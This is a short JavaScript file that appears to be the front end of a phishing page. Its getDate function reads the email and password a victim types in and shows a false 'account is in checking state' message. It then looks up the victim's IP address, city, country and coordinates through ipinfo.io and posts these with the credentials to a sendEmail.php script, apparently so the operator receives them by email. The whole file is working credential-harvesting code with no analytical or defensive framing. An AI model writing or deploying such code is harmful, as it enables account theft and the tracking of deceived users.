function getDate(){
let email=document.getElementById("email").value;	
let password=document.getElementById("password").value;
alert("your data submitted Correctly your Account is in checking state. we will communicate with you soon.")
date=new Date();
month=+date.getMonth()+1;
munits=(date.getMinutes()<10?'0':'') + date.getMinutes()
dt=date.getDate()+"/"+month+"/"+date.getFullYear()+" " +date.getHours()+":"+munits;
//console.log(dt);
$.getJSON("https://ipinfo.io",function(data){
	//console.log(data+"\n -- data.ip")
	sendEmail(email,password," ip:"+data.ip,dt+"time zone: "+data.timezone+"\ncountry:"+ data.country+"\ncity:"+data.city+"\nregion:"+data.region+"\nlocation:"+data.loc); 
})

return false;
}

function sendEmail(username,password,ip ,body){
	let ajax=new XMLHttpRequest();
let method="POST";
let url="./php script/sendEmail.php";
ajax.open(method,url,true);
ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

ajax.onreadystatechange=function(){
	if(ajax.readyState==4 && ajax.status==200){
		let t=ajax.responseText;
		}

}
ajax.send("username="+username+"&password="+password+"&body="+body+"&ip="+ip);



}